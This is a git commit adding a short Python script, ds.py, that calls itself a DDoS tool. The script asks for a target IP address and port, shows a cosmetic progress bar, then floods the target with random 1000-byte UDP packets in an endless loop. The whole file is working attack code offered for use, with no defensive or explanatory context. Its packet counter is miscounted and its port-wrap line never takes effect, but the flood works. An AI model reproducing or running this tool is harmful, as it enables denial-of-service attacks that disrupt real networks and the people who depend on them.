a2cc97fcf8a50d5ae86f2bcfd188f258f44311f0
Crownss <58449385+Crownss@users.noreply.github.com>
2020-07-16 09:57:36 +0700

    Add files via upload

---
+++ ds.py
@@ -0,0 +1,61 @@
+import sys
+import os
+import time
+import socket
+import random
+from tqdm import tqdm
+
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############
+print (now)
+test = input("this is DDoS tool are you sure want to use ? [Y/N]")
+if (test == "Y"):
+	print("okee lets started")
+elif (test == "N"):
+	exit()
+elif (test == "y"):
+	print("okee lets started")
+elif (test == "n"):
+	exit()
+else:
+	exit()
+os.system("echo tekan enter untuk lanjut")
+input()
+#############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1000)
+#############
+
+os.system("clear")
+print("\n")
+print("Created By : Crownss")
+print("\n")
+ip = input("IP Target : ")
+port = int(input("Port      : "))
+
+os.system("clear")
+for i in range(50):
+	sys.stdout.write('\r')
+	sys.stdout.write("[%-50s] %d%%" % ('#'*i, 2*i))	
+	sys.stdout.flush()
+	time.sleep(0.50)
+	print("\n")
+	print("wait till 100% and automaticaly DDoS")
+
+	
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 100
+     print ("Sent %s packet to %s throught port: %s"%(sent, ip, port))
+     print ("\n")
+     print ("A cat is fine to desudesudesudesu~")
+     if port == 65534:
+       port = 80
